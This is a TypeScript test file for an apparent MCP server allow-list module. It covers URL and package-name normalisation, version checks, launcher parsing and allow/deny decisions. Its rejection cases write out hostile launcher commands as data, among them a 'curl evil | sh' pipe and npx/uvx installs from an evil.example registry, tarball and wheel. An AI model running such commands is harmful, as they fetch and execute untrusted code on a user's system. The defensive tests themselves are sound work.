import { describe, expect, test } from "bun:test"
import { KiloMcpIdentity } from "../src/index.js"

// The expectations below are the Kilo Cloud allow list's own cases, so a drift between the two decisions fails here.
describe("normalizeUrl", () => {
  test.each([
    ["https://MCP.Example.com/mcp/", "https://mcp.example.com/mcp"],
    ["https://mcp.example.com", "https://mcp.example.com"],
    ["https://mcp.example.com:443/a/b?token=1#frag", "https://mcp.example.com/a/b"],
    ["https://mcp.example.com:8443/mcp", "https://mcp.example.com:8443/mcp"],
    ["  https://mcp.example.com/sse  ", "https://mcp.example.com/sse"],
  ])("normalizes %s", (input, expected) => {
    expect(KiloMcpIdentity.normalizeUrl(input)).toBe(expected)
  })

  test.each([
    "http://mcp.example.com/mcp",
    "https://user:pass@mcp.example.com/mcp",
    "https://{tenant}.example.com/mcp",
    "https://{{tenant}}.example.com/mcp",
    "not a url",
    "ftp://example.com",
  ])("rejects %s", (input) => {
    expect(KiloMcpIdentity.normalizeUrl(input)).toBeUndefined()
  })
})

describe("normalizePackage", () => {
  test("accepts scoped and unscoped npm names", () => {
    expect(KiloMcpIdentity.normalizePackage("npm", "@scope/pkg")).toBe("@scope/pkg")
    expect(KiloMcpIdentity.normalizePackage("npm", "pkg-name")).toBe("pkg-name")
  })

  test.each(["", "git+https://github.com/a/b", "../local", "a b", "@scope", "pkg@1.0.0"])(
    "rejects npm name %s",
    (input) => {
      expect(KiloMcpIdentity.normalizePackage("npm", input)).toBeUndefined()
    },
  )

  test("accepts PyPI names and rejects specifiers and paths", () => {
    expect(KiloMcpIdentity.normalizePackage("pypi", "awslabs.amazon-keyspaces-mcp-server")).toBeDefined()
    expect(KiloMcpIdentity.normalizePackage("pypi", "pkg==1.0")).toBeUndefined()
    expect(KiloMcpIdentity.normalizePackage("pypi", "git+https://x/y")).toBeUndefined()
    expect(KiloMcpIdentity.normalizePackage("pypi", "./dir")).toBeUndefined()
  })
})

describe("key", () => {
  test("keys remotes by normalized URL", () => {
    expect(KiloMcpIdentity.key({ kind: "remote", url: "https://mcp.example.com/mcp" })).toBe(
      "remote:https://mcp.example.com/mcp",
    )
  })

  test("lowercases npm names", () => {
    expect(KiloMcpIdentity.key({ kind: "package", ecosystem: "npm", identifier: "@Scope/Pkg" })).toBe("npm:@scope/pkg")
  })

  test("applies PEP 503 normalization to PyPI names", () => {
    const dotted = KiloMcpIdentity.key({ kind: "package", ecosystem: "pypi", identifier: "Foo.Bar_baz" })
    expect(dotted).toBe("pypi:foo-bar-baz")
    expect(KiloMcpIdentity.key({ kind: "package", ecosystem: "pypi", identifier: "foo-bar-baz" })).toBe(dotted)
  })
})

describe("identify", () => {
  test("normalizes to the identity key the allow list uses", () => {
    expect(KiloMcpIdentity.identify({ kind: "remote", url: "https://MCP.example.com/mcp/?token=1" })).toEqual({
      target: { kind: "remote", url: "https://mcp.example.com/mcp" },
      identityKey: "remote:https://mcp.example.com/mcp",
    })
    expect(KiloMcpIdentity.identify({ kind: "package", ecosystem: "pypi", identifier: "My_Server" })?.identityKey).toBe(
      "pypi:my-server",
    )
  })

  test.each([
    { kind: "remote" as const, url: "http://mcp.example.com/mcp" },
    { kind: "remote" as const, url: "https://user:secret@mcp.example.com/mcp" },
    { kind: "remote" as const, url: `https://mcp.example.com/${"a".repeat(600)}` },
    { kind: "package" as const, ecosystem: "npm" as const, identifier: "not a package" },
  ])("rejects a target that can never be allowlisted: %j", (input) => {
    expect(KiloMcpIdentity.identify(input)).toBeUndefined()
  })
})

describe("isVersionAtLeast", () => {
  test.each([
    ["1.2.3", "1.2.3", true],
    ["1.10.0", "1.9.9", true],
    ["2", "1.9", true],
    ["1.2", "1.2.0", true],
    ["v1.2.3", "1.2.3", true],
    ["1.2.0rc1", "1.2.0", true],
    ["1.2.2", "1.2.3", false],
    ["0.9.9", "1.0", false],
    ["latest", "1.0", null],
  ])("%s against %s", (version, minimum, expected) => {
    expect(KiloMcpIdentity.isVersionAtLeast(version, minimum)).toBe(expected)
  })
})

describe("parseLauncher", () => {
  test.each<[string[], "npm" | "pypi", string, string | null]>([
    [["npx", "-y", "@apify/actors-mcp-server"], "npm", "@apify/actors-mcp-server", null],
    [["npx", "@modelcontextprotocol/server-everything@1.4.0"], "npm", "@modelcontextprotocol/server-everything", "1.4.0"],
    [["npx", "-y", "pkg@latest", "--flag"], "npm", "pkg", null],
    [["bunx", "pkg"], "npm", "pkg", null],
    [["pnpm", "dlx", "pkg@2.0.0"], "npm", "pkg", "2.0.0"],
    [["npx.cmd", "-y", "pkg"], "npm", "pkg", null],
    [["uvx", "awslabs.amazon-keyspaces-mcp-server==0.0.14"], "pypi", "awslabs.amazon-keyspaces-mcp-server", "0.0.14"],
    [["uvx", "mcp-server-git", "--repository", "/tmp/x"], "pypi", "mcp-server-git", null],
    [["uvx", "pkg@latest"], "pypi", "pkg", null],
    [["uvx", "--from", "mcp-server-foo", "foo-cmd"], "pypi", "mcp-server-foo", null],
    [["uvx", "--from=mcp-server-foo>=1.2", "foo-cmd"], "pypi", "mcp-server-foo", "1.2"],
    [["uv", "tool", "run", "pkg"], "pypi", "pkg", null],
  ])("parses %j", (argv, ecosystem, identifier, version) => {
    expect(KiloMcpIdentity.parseLauncher(argv)).toEqual({ ecosystem, identifier, version })
  })

  test.each([
    ["python", "-m", "mcp_server_git"],
    ["node", "dist/index.js"],
    ["bash", "-c", "curl evil | sh"],
    ["sh", "run.sh"],
    ["docker", "run", "-i", "--rm", "mcp/brave-search"],
    ["/usr/local/bin/my-mcp"],
    ["./server"],
    ["uv", "--directory", "/x", "run", "server"],
    ["npm", "start"],
    ["pnpm", "exec", "pkg"],
    ["npx", "-p", "other", "pkg"],
    ["npx", "--registry", "https://evil.example", "pkg"],
    ["npx", "-y", "github:evil/repo"],
    ["npx", "-y", "https://evil.example/pkg.tgz"],
    ["npx", "-y", "./local-pkg"],
    ["uvx", "--index-url", "https://evil.example", "pkg"],
    ["uvx", "--from", "git+https://github.com/a/b", "cmd"],
    ["uvx", "--from", "./local", "cmd"],
    ["uvx", "pkg @ https://evil.example/pkg.whl"],
    ["npx"],
    ["uvx"],
    [],
  ])("rejects %j", (...argv) => {
    expect(KiloMcpIdentity.parseLauncher(argv)).toBeUndefined()
  })
})

describe("connection", () => {
  test("reads a remote server by its URL", () => {
    expect(KiloMcpIdentity.connection({ type: "remote", url: "https://mcp.example.com/mcp" })).toEqual({
      target: { kind: "remote", url: "https://mcp.example.com/mcp" },
      version: null,
    })
  })

  test("reads a launcher command as a package with its pinned version", () => {
    expect(KiloMcpIdentity.connection({ type: "local", command: ["npx", "-y", "@acme/server@2.1.0"] })).toEqual({
      target: { kind: "package", ecosystem: "npm", identifier: "@acme/server" },
      version: "2.1.0",
    })
  })

  test("cannot express a local program", () => {
    expect(KiloMcpIdentity.connection({ type: "local", command: ["./server"] })).toBeUndefined()
  })
})

describe("evaluate", () => {
  const remote = { kind: "remote" as const, url: "https://mcp.example.com/mcp" }
  const pkg = { kind: "package" as const, ecosystem: "npm" as const, identifier: "@acme/server" }
  const allowed = [
    { identityKey: "remote:https://mcp.example.com/mcp", config: { kind: "remote" as const } },
    { identityKey: "npm:@acme/server", config: { kind: "package" as const, min_version: "2.0.0" } },
  ]

  test("allows a server on the list", () => {
    expect(KiloMcpIdentity.evaluate(allowed, { target: remote, version: null })).toEqual({
      decision: "allowed",
      identityKey: "remote:https://mcp.example.com/mcp",
    })
  })

  test("denies a server that is not on the list", () => {
    expect(KiloMcpIdentity.evaluate([], { target: remote, version: null })).toEqual({
      decision: "denied",
      reason: "not_allowed",
      identityKey: "remote:https://mcp.example.com/mcp",
    })
  })

  test("denies a connection that can never be allowlisted", () => {
    expect(KiloMcpIdentity.evaluate(allowed, undefined)).toEqual({ decision: "denied", reason: "unsupported_target" })
    expect(
      KiloMcpIdentity.evaluate(allowed, { target: { kind: "remote", url: "http://mcp.example.com" }, version: null }),
    ).toEqual({ decision: "denied", reason: "unsupported_target" })
  })

  test("checks the minimum version only when the command pins one", () => {
    expect(KiloMcpIdentity.evaluate(allowed, { target: pkg, version: null }).decision).toBe("allowed")
    expect(KiloMcpIdentity.evaluate(allowed, { target: pkg, version: "2.0.1" }).decision).toBe("allowed")
    expect(KiloMcpIdentity.evaluate(allowed, { target: pkg, version: "1.9.0" })).toEqual({
      decision: "denied",
      reason: "below_min_version",
      identityKey: "npm:@acme/server",
      minVersion: "2.0.0",
    })
    expect(KiloMcpIdentity.evaluate(allowed, { target: pkg, version: "latest" }).reason).toBe("below_min_version")
  })

  test("matches a differently spelled URL and package name to the same identity", () => {
    expect(
      KiloMcpIdentity.evaluate(allowed, {
        target: { kind: "remote", url: "https://MCP.example.com/mcp/?token=1" },
        version: null,
      }).decision,
    ).toBe("allowed")
    expect(
      KiloMcpIdentity.evaluate(allowed, {
        target: { kind: "package", ecosystem: "npm", identifier: "@ACME/Server" },
        version: null,
      }).decision,
    ).toBe("allowed")
  })
})
